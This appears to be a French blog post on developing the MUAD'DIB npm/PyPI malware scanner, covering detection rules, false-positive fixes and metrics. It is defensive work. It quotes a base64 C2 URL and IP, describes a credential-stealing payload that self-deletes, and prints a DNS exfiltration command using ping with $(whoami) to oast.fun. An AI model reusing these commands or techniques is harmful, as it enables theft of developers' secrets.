En cadeau bonus, l'audit a reconfirme **react-emits**, un malware que j'avais detecte en live le 5 avril et que j'avais documente dans un blog post. Mais le VPS a trouve une info que le blog n'avait pas : l'attaquant a fait 4 versions en 4 heures, et entre la v1.0.0 (split payload/trigger via 5 deps malveillantes) et la v1.0.2, il a hardcode les URLs C2 directement dans `path.js` aux lignes 75-76 (`var randomStringRe = "aHR0cDovLzE3My4yMTEuNDYuMjIwL2x2ZXJsYS5qcw=="`). La v1.0.3 etait un retract partiel casse — il a retire les variables mais laisse les IIFE, ce qui fait crasher le package au load avec `ReferenceError: randomStringRe is not defined`. Un attaquant en panique qui se coupe lui-meme la branche. J'ai ajoute react-emits en fixture ground-truth (GT-067) avec l'IP C2 `173.211.46.220` dans le fichier d'IOC markers.

18 heures de travail pour les 4 fixes + la fixture + les tests + la doc. Et puis j'ai voulu synchroniser ma branche avec master avant de push la PR. **`git merge master`**. Conflit. Mauvaise resolution. Le merger a garde l'appel a `isWasmEmscriptenArtifact(file, content)` dans `obfuscation.js:20` mais a jete la declaration de la fonction (et les constants WASM_BASENAME_RE / WASM_CONTENT_MARKERS). Meme chose pour les 10 autres fichiers P1-P4 — 701 lignes de mon travail supprimees en un commit. La CI a casse avec `ReferenceError: isWasmEmscriptenArtifact is not defined`.

J'ai panique pendant 30 secondes, puis je me suis rappele que git ne perd jamais un commit reference. Mon commit valide etait toujours dans l'historique (`72626b8`), juste enterre sous le merge casse. Un `git checkout 72626b8 -- <les 13 fichiers impactes>` a tout restaure. Tests relances, 3134 passed 0 failed (apres avoir aussi restaure 4 fichiers WIP qui contenaient un fix de securite TIER1 anti-evasion dans le sandbox deferred — protege contre un adversaire qui tune son malware a fire uniquement des TIER1_TYPES en LOW severity pour bypass la revue sandbox), commit "fix: restore P1-P4 FP cluster changes lost in master merge" + "fix: restore TIER1 sandbox evasion guard", push. CI relancee. Lecon : toujours tester apres un merge, meme (surtout) quand tu crois que c'etait propre.

Estimation du gain FPR : **14% → 6-9%**. Je mesurerai pour de vrai apres la release. Le TPR reste a 93.75% (aucune regression sur le ground truth, maintenant 67 samples avec react-emits). La release est v2.10.74.

---

## Security review semaine 10-17 avril (v2.10.93-97)

Une semaine de monitoring 24/7 = environ 22 858 tarballs scannes, dont une fraction non triviale qui me reste sur l'ecran sous forme d'alertes Discord. Pour ne pas finir par tout ignorer, je me suis impose une revue manuelle complete de tout ce que le scanner a flagge entre le 10 et le 17 avril 2026. 37 packages confirmes malveillants au final, dont 10 qui passaient sous le seuil de triage (`ADR_THRESHOLD=20`). Deux campagnes m'ont fait realiser que la detection avait des angles morts structurels.

**ltidi : la chaine d'attaque qui n'a pas besoin d'install hooks.** 9 packages stub publies avec `package.json` propre, aucun script lifecycle, aucune obfuscation, score 10. Mais une dependance vers `ltidisafe`, hostee comme tarball directe sur `ltidi.storage.googleapis.com`. npm n'audite pas les dependances par URL HTTPS, donc le payload reel n'est jamais examine par le registry. Quand j'ai telecharge le tarball externe et lu le code, c'etait un DNS exfil de `hostname/homedir/username` via des sous-domaines hex sur `*.oastify.com` (un service public de OOB callbacks). 9 packages, score 10 chacun, completement sous le radar.

**csec : self-destruct apres exfil.** 3 packages avec un score de 19. XOR avec cle `OrDeR_7077` + `new Function(decoded)` pour evaluer le payload + `unlinkSync(__filename)` pour effacer le source apres execution. Exfiltre `.env`, tokens, cles SSH, `.npmrc`, `.aws/credentials` vers `csec-supply-chain-attack.vercel.app`. 19 c'est en dessous du threshold, donc aucune alerte declenchee.

J'ai sorti la v2.10.93 avec 3 patches : escalation `dependency_url_suspicious` a CRITICAL pour les tarballs externes hors allowlist (la rule devient `external_tarball_dep` en v2.10.94 avec un ID dedie `MUADDIB-PKG-020`), nouvelle compound `self_destruct_eval` (CRITICAL, AST-089) qui matche `eval`/`new Function` + suppression de `__filename`/`module.filename`, et 6 nouveaux IOC domains (oast.online, oast.pro, interact.sh, etc.) plus 12 packages compromis ajoutes a la builtin. 207 rules au total. Tests : 3134 → 3230.

---

## La ronde des sous-threshold (v2.10.94)

Apres le merge de v2.10.93, j'ai re-scanne les meme packages pour mesurer si les fixes faisaient ce qu'ils etaient censes faire. Resultats interessants : ltidi passait bien de 10 a 35 (CRITICAL `external_tarball_dep` + HIGH `dependency_ioc_match`), mais le MT-1 score ceiling cappait a 35 parce que `dependency_url_suspicious` n'etait pas dans `HIGH_CONFIDENCE_MALICE_TYPES`. Csec restait a 19 parce que `self_destruct_eval` ne matchait pas : le `unlinkSync(__filename)` etait DANS le string XOR-encode, pas dans le source visible. Apache-arrow-14 capait a 50 (le floor CRITICAL existant) sans mecanisme pour pousser plus haut. Et koa-v3 etait a 9 parce que `curl_env_exfil` ne detectait que `curl` et `wget`, pas `ping`/`nslookup`/`dig`.

4 fixes scoped, tous mesures empiriquement avant merge :

1. **Nouveau threat type `external_tarball_dep`** (`src/scanner/package.js`, rule `MUADDIB-PKG-020`, CRITICAL). Sortie de `dependency_url_suspicious` quand l'URL est une tarball (.tgz/.tar.gz/.tar.bz2/.zip) ET l'host n'est pas dans l'allowlist (github.com, codeload.github.com, gitlab.com, registry.npmjs.org, registry.yarnpkg.com). Ajoute a `HIGH_CONFIDENCE_MALICE_TYPES` pour bypass le MT-1 ceiling.

2. **`function_runtime_args`** (`src/scanner/ast-detectors/handle-new-expression.js`, rule `MUADDIB-AST-090`, CRITICAL). Fire quand `new Function()` recoit >= 2 args literal runtime (`require`, `__dirname`, `__filename`, `module`, `exports`, `process`) + body dynamique + obfuscation dans le meme fichier (`hasFromCharCode || hasBase64Decode || hasZlibInflate`). Le gating obfuscation est crucial : sans lui, on tire sur babel-register, ts-node, pirates, jest, nyc, vitest qui ont tous des wrappers CommonJS legitimes avec `new Function('require', '__dirname', body)`.

3. **`curl_env_exfil` regex etendue** : ajout de `ping|nslookup|dig|host|getent` au pattern. Catche koa-v3 qui faisait `ping -c 1 $(whoami).<hex>.oast.fun`. C'est une evasion bete qu'on aurait pu prevoir, mais on n'avait jamais teste.

4. **Floor a 75 quand 2+ threat types DISTINCTS sont CRITICAL package-level** (`src/scoring.js`). Co-occurrence 2 CRITICAL package-level sans aucun benign non-malware = signature quasi-certaine. Apache-arrow-14 (`curl_env_exfil` + `lifecycle_env_exfil`) passe de 50 a 75. Koa-v3 idem.

Resultats post-merge sur les memes tarballs : ltidi 35 → 50, csec-crypto-toolkit 19 → **88**, apache-arrow-14 50 → 75, koa-v3 9 → 75. Les 4 sortent du sous-threshold. Tests : 3230 → 3232. Rules : 207 → **209**.

---

## Le triple-gate qui n'a rien fait (v2.10.95)

J'ai repere une issue plus subtile dans `src/scanner/ast.js:211` : le check `hasHashVerification` etait une regex sur `createHash + digest`. Un attaquant pouvait declencher le downgrade CRITICAL → HIGH de `download_exec_binary` avec juste `crypto.createHash('sha256').update(buf).digest('hex')` sans jamais comparer le resultat. Bypass a 3 lignes.

Fix simple : la regex exige maintenant aussi un operateur de comparaison dans le meme fichier (`===`, `!==`, `.equals(`, `assert.strictEqual`/`equal`/`deepEqual`/`deepStrictEqual`, `throw`). Mesure sur 545 packages benign curated : **0 FPR delta**. Le durcissement ne reclassifie personne (tous les packages avec `createHash + digest` avaient deja une comparaison visible quelque part). Le gain est purement defensif.

J'avais aussi propose un downgrade CRITICAL → MEDIUM quand `download_exec_binary` co-occurre avec `hasHashVerification=true` ET `fetchOnlySafeDomains=true`. L'hypothese : ~180 packages Cluster A legitimes (electron, sharp, @spencer-kit/aor, etc.) beneficieraient. Diagnostic empirique sur 545 packages : **0 FPR delta** (15.60 % → 15.60 %). La rule fire sur 3 packages seulement, dont 2 etaient deja LOW et le troisieme (esbuild) est domine par d'autres rules CRITICAL. Le downgrade aurait 0 impact mesurable.

J'ai abandonne le triple-gate. Lecon : ne pas merger un fix qui ne montre pas de gain mesure, meme si la justification theorique est solide. La doc est dans `data/fp-v2.10.95-validation.md` (gitignored, le diagnostic complet vaut d'etre garde).

Bonus de la release : un fix EPERM Windows dans `evaluate.js`. Le workflow `node bin/muaddib.js evaluate` crashait au premier package qui declenchait EPERM (locked file, long path, antivirus). Exemple observe sur `ejs` au package 369/548 : `fs.rmSync(pkgCacheDir, { recursive: true })` sur un cleanup post-erreur d'extraction remontait l'exception non-catchee jusqu'au top-level catch de `bin/muaddib.js:608`, tuant l'evaluation entiere. 8 occurrences enveloppees dans try/catch silencieux + 3 boucles `evaluateBenign*` qui wrappent le scan en try/catch (un package qui plante est marque `skipped++`, l'eval continue). Tests : 3232 → 3236.

---

## Quand le scanner tape sur de la doc legitime (v2.10.96-97)

Sur le corpus humain que j'ai construit en revisant manuellement les alertes, j'avais 198 false positives confirmes et 104 vrais malwares. Le scanner mettait les deux ensemble dans la zone CRITICAL. Toutes les heuristiques ajoutees depuis v2.10.74 (P1-P4 + audit forensique) avaient deja capture les clusters faciles. Les 198 FP qui restaient se repartissaient en 7 patterns assez precis :

1. Bundles minifies sans aucun script lifecycle (`babylonjs.bundle.js`, `vue.runtime.global.prod.js`).
2. Installers binaires telechargeant depuis GitHub Releases (esbuild, swc, sharp, prebuild-install).
3. Endpoints reseau dans le scope du package lui-meme (`@stripe/stripe-js` qui fetch `api.stripe.com`).
4. Git hooks ecrits depuis source locale (husky, simple-git-hooks).
5. Typosquats sur des noms scoped : Levenshtein faux trigger sur `@scope/foo` vs `@scope/foobar`.
6. Obfuscation commerciale (jscrambler, javascript-obfuscator) sans aucun signal d'attaque.
7. Packages placeholder publies pour bloquer du dependency confusion (souvent un `index.js` avec `module.exports = {}` et un README qui dit "this is a placeholder").

Plutot que d'ajouter encore des heuristiques negatives au scanner (qui finiraient par tirer aussi sur des malwares qui imitent ces patterns), j'ai change d'approche. On va construire les **features contextuelles** dont un classifier ML aurait besoin pour discriminer ces 7 clusters des vrais malwares qui leur ressemblent.

**v2.10.96** est de la pure plomberie. 8 features dans `src/ml/feature-extractor.js`, chacune un boolean calculable depuis le scan result + les metadonnees package (npm registry meta, file sizes, scripts) :

| ID | Feature | Cluster cible |
|----|---------|---------------|
| F1 | `bundle_without_install_scripts` | Bundles minifies sans lifecycle |
| F2 | `install_url_github_releases` | Binaires depuis GitHub Releases |
| F3 | `network_destination_first_party` | Reseau dans le scope du package |
| F4 | `git_hook_source_local` | Git hooks locaux |
| F5 | `typosquat_scoped_package` | Faux trigger Levenshtein sur scoped |
| F6 | `obfuscation_without_vector` | Obfuscation commerciale sans attaque |
| F7 | `placeholder_anti_dep_confusion` | Placeholder dependency confusion |
| F8 | `install_script_no_network_egress` | **DESACTIVEE** |

F8 est volontairement laissee inerte (`features.install_script_no_network_egress = 0`). En mesurant la sortie sur le corpus malveillant, je me suis rendu compte qu'elle classifiait comme "install script sans egress reseau" des malwares qui exfiltrent via `dangerous_exec` (curl/wget directs sans utiliser les types reseau Node.js trackes par `EGRESS_TYPES`). Si je l'avais activee, le ML retrain aurait appris "install_script_no_network_egress = benign" sur des malwares confirmes. Mieux vaut une feature inactive qu'une feature qui pollue. Je la re-activerai apres avoir fixe `EGRESS_TYPES` (ajout de `dangerous_exec`, `lifecycle_dangerous_exec`, `node_inline_exec`).

Cette release ne change rien au scoring. Les scans v2.10.96 produisent les memes scores que v2.10.95 sur tous les packages. Les 8 nouvelles colonnes de features sont ecrites dans `ml-training-monitor.jsonl` mais ne sont pas consommees par le pipeline. Plomberie pure.

**v2.10.97** branche les 7 features actives directement dans le scoring comme post-filtre deterministe. `applyContextualFPCaps()` dans `src/scoring.js`, appele APRES `calculateRiskScore` (donc apres les compound boosts et les lifecycle floors). Sept caps deterministes, valides individuellement avec **0 malware impacte** comme critere non-negociable :

| Code | Cap | Justification |
|------|-----|---------------|
| F1 | 30 | Bundle minifie publie sans lifecycle = bibliotheque, pas un dropper |
| F2 | 35 | Installer binaire depuis GitHub Releases = pattern legitime |
| F3 | 30 | Endpoint reseau dans le scope du package |
| F4 | 35 | Git hooks ecrits depuis source locale |
| F5 | -- | Soustrait les points typosquat (pas un cap) |
| F6 | 35 | Obfuscation commerciale sans signaux d'attaque |
| F7 | 20 | Placeholder anti-dep-confusion |

Quand plusieurs caps s'appliquent au meme package, le `Math.min()` gagne (cap le plus serre). F5 est traite separement parce qu'il soustrait des points au lieu de plafonner.

Validation finale sur le corpus humain 302 packages : **67/198 FP cappes (33.8 %)**, **0/104 malware impacte**. Les 131 FP CRITICAL restants ne matchent aucun des 7 clusters. Pour les attaquer, il faudra s'attaquer a la dedup compound scoring dans `src/scoring.js` (probablement v2.10.98+). C'est un gain visible, pas spectaculaire, mais surtout : **deterministe**, donc pas de risque de regression silencieuse comme aurait pu en avoir une approche ML qui se reentraine.

Tests : 3258 → **3280**. Pas de nouvelle rule, pas de nouveau scanner. Le post-filtre est une couche au-dessus du scoring existant.

---

## Lecons de la semaine

1. **Mesurer avant de merger.** Le triple-gate v2.10.95 paraissait evident mais n'avait aucun impact mesure. La regle "0 FPR delta = pas de merge" m'a evite de polluer le code avec une heuristique qui ne sert a rien.

2. **Tester les features ML sur le corpus malveillant aussi.** F8 aurait ete une feature qui labellise des malwares comme benins si je ne l'avais pas mesuree avant activation. Une feature qui semble bien discriminer sur le corpus FP peut etre catastrophique sur le corpus malveillant.

3. **Les sous-threshold sont les vrais ennemis.** ltidi et csec etaient les attaques les plus critiques de la semaine, pas a cause de leur sophistication, mais parce qu'elles passaient SOUS le radar (`score < ADR_THRESHOLD`). Tout le travail sur les rules HIGH/CRITICAL ne sert a rien si l'attaquant peut juste mettre son score a 19.

4. **Le post-filtre deterministe vs le ML.** J'avais des features ML pretes, mais j'ai prefere les brancher en post-filtre deterministe plutot qu'en classifier. Raison : pas de risque de regression silencieuse au prochain retrain, decouplage de la stabilisation FPR de l'iteration ML, et chaque cap est explicable individuellement (un humain peut comprendre pourquoi un package a ete cap a 30).

5. **Le corpus humain 302 packages ne remplace pas les 548 curated.** La couverture FP varie selon le corpus. Le post-filtre v2.10.97 a ete valide sur le corpus humain ; la remesure sur les 548 curated est encore a faire. Les chiffres "33.8 % de FP cappes" ne sont pas extrapolables tels quels au corpus general.

6. **Les estimations valent ce qu'elles valent.** v2.10.74 estimait une reduction FPR 14% → 6-9% apres les fixes P1-P4 (cluster bundle/AST-006/quick-scan/WASM). La mesure reelle en v2.10.95 sur le corpus reconstruit a donne **15.6% (85/545)** : la reduction promise ne s'est PAS materialisee. Le corpus a derive entre les deux mesures, et les fixes P1-P4 ont ete absorbes par d'autres augmentations FP. Lecon : ne JAMAIS publier une "reduction projettee" sans la mesurer reellement, et toujours retourner verifier post-merge sur le meme corpus.

---

## Ou j'en suis

3 mois et demi de projet. 209 regles de detection, 14 scanners, 3280 tests. Un moniteur en 24/7 sur npm et PyPI. Deux modeles ML entraines plus 7 features contextuelles branches en post-filtre deterministe. Un ground truth passe de 4 malwares a 67 samples + 377 confirmed_malicious dans l'auto-labeler.

Les chiffres qui comptent (mesure canonique v2.10.95) : **TPR@3 93.85%** (61/65 attaques actives detectees, 67 totales avec 2 protestware hors-scope), **TPR@20 86.2%** (56/65 sur le seuil operationnel), **FPR curated 15.6%** (85/545 scannes sur 548), **FPR random 7.0%** (14/200), **ADR 96.3%** (103/107 samples adversariaux). Ce ne sont pas des scores parfaits, et c'est le point : un scanner avec 0% de FP ne scanne probablement rien, et un TPR de 100% sur 4 samples ne veut rien dire.

Ce qui marche bien : la detection des campagnes connues (Shai-Hulud, GlassWorm, CanisterWorm), la desobfuscation statique qui voit a travers les techniques d'evasion courantes, le sandbox avec acceleration temporelle pour les time-bombs, le compound scoring qui exploite les combinaisons impossibles en code legitime, et le dataflow inter-module qui suit les credentials a travers les frontieres de fichiers.

Ce qui manque, honnetement : le triage LLM pour filtrer automatiquement les alertes (design doc pret, pas deploye). L'interception TLS dans le sandbox — on capture le SNI mais pas le contenu. La desobfuscation avancee — les obfuscateurs comme JScrambler utilisent des transformations de flux de controle que l'approche statique ne peut pas resoudre. Le support au-dela de npm et PyPI. Et un dashboard web — MUAD'DIB reste un outil CLI. Suffisant pour un dev qui verifie un package avant de l'installer, mais ca ne scale pas pour de la surveillance d'entreprise.

La lecon la plus importante de tout le projet : les donnees sont plus importantes que le code. Le meilleur algorithme du monde ne sert a rien avec des labels contamines. Les meilleures heuristiques ne servent a rien si le FPR est mesure sur des repertoires vides. L'honnetete sur les limites n'est pas une faiblesse — c'est la seule facon de progresser.

---

## Liens

- **npm** : npmjs.com/package/muaddib-scanner
- **GitHub** : github.com/DNSZLSK/muad-dib
- **VS Code** : marketplace.visualstudio.com/items?itemName=dnszlsk.muaddib-vscode
- **Discord** : discord.gg/y8zxSmue

---

## Conclusion

MUAD'DIB n'est pas parfait. C'est un projet de formation, pas un produit enterprise. Mais il fonctionne pour ce qu'il est cense faire : detecter les menaces npm et PyPI connues, analyser les comportements suspects dans un sandbox, et prouver son efficacite avec des metriques de validation honnetes.

*"Fear is the mind-killer. I will face my fear."* - Dune, Frank Herbert
